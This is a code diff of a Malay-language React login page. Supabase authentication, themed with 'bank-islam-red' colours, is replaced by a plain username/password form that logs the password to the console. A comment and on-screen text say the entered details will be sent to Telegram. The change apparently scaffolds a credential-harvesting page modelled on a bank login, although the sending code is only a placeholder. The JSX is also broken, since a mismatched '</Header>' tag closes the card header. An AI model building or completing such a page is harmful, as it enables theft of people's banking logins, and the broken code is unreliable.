@@ -1,81 +1,74 @@
-import { Auth } from '@supabase/auth-ui-react';
-import { ThemeSupa } from '@supabase/auth-ui-shared-supa';
-import { supabase } from '@/lib/supabase';
-import { useNavigate } from 'react-router-dom';
-import { useEffect } from 'react';
-import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
+import { useState } from "react";
+import { Button } from "@/components/ui/button";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { showError, showSuccess } from "@/utils/toast";
 
 const LoginPage = () => {
-  const navigate = useNavigate();
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
-  useEffect(() => {
-    const { data: { subscription } } = supabase.auth.onAuthStateChange((event, session) => {
-      if (session) {
-        // Arahkan pengguna ke halaman utama selepas berjaya log masuk
-        navigate('/');
-      }
-    });
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsLoading(true);
 
-    return () => {
-      subscription.unsubscribe();
-    };
-  }, [navigate]);
+    try {
+      // Logik untuk menghantar ke Telegram akan ditambah di sini
+      console.log("Username:", username, "Password:", password);
+      
+      // Simulasi permintaan rangkaian
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      showSuccess('Maklumat berjaya dihantar!');
+      setUsername('');
+      setPassword('');
+    } catch (error) {
+      showError('Gagal menghantar maklumat.');
+    } finally {
+      setIsLoading(false);
+    }
+  };
 
   return (
     <Card className="w-full max-w-sm text-left shadow-lg animate-fade-in-up">
       <CardHeader>
-        <CardTitle className="text-2xl font-bold text-foreground">Log Masuk / Daftar</CardTitle>
+        <CardTitle className="text-2xl font-bold text-foreground">Log Masuk</CardTitle>
         <CardDescription className="text-foreground/80">
-          Gunakan e-mel anda untuk log masuk atau mendaftar akaun baru.
+          Maklumat yang anda masukkan akan dihantar ke Telegram.
         </CardDescription>
-      </CardHeader>
+      </Header>
       <CardContent>
-        <Auth
-          supabaseClient={supabase}
-          appearance={{ 
-            theme: ThemeSupa,
-            variables: {
-              default: {
-                colors: {
-                  brand: 'hsl(var(--bank-islam-red))',
-                  brandAccent: 'hsl(var(--bank-islam-red-dark))',
-                  brandButtonText: 'white',
-                },
-                radii: {
-                  borderRadius: 'var(--radius)',
-                  buttonBorderRadius: 'var(--radius)',
-                }
-              }
-            }
-          }}
-          theme="dark"
-          providers={[]}
-          localization={{
-            variables: {
-              sign_in: {
-                email_label: 'Alamat E-mel',
-                password_label: 'Kata Laluan',
-                email_input_placeholder: 'e-mel-anda@domain.com',
-                password_input_placeholder: 'Kata laluan anda',
-                button_label: 'Log Masuk',
-                link_text: 'Sudah mempunyai akaun? Log masuk',
-              },
-              sign_up: {
-                email_label: 'Alamat E-mel',
-                password_label: 'Kata Laluan',
-                email_input_placeholder: 'e-mel-anda@domain.com',
-                password_input_placeholder: 'Kata laluan anda',
-                button_label: 'Daftar',
-                link_text: 'Belum mempunyai akaun? Daftar',
-              },
-              forgotten_password: {
-                email_label: 'Alamat E-mel',
-                button_label: 'Hantar Arahan Tetapan Semula',
-                link_text: 'Lupa kata laluan?',
-              },
-            },
-          }}
-        />
+        <form onSubmit={handleSubmit} className="space-y-4">
+          <div className="space-y-2">
+            <Label htmlFor="username">Nama Pengguna</Label>
+            <Input
+              id="username"
+              type="text"
+              placeholder="cth: pengguna_hebat"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
+              required
+              autoComplete="username"
+            />
+          </div>
+          <div className="space-y-2">
+            <Label htmlFor="password">Kata Laluan</Label>
+            <Input
+              id="password"
+              type="password"
+              placeholder="••••••••"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              required
+              autoComplete="current-password"
+            />
+          </div>
+          <Button type="submit" className="w-full" disabled={isLoading}>
+            {isLoading ? 'Menghantar...' : 'Log Masuk & Hantar'}
+          </Button>
+        </form>
       </CardContent>
     </Card>
   );
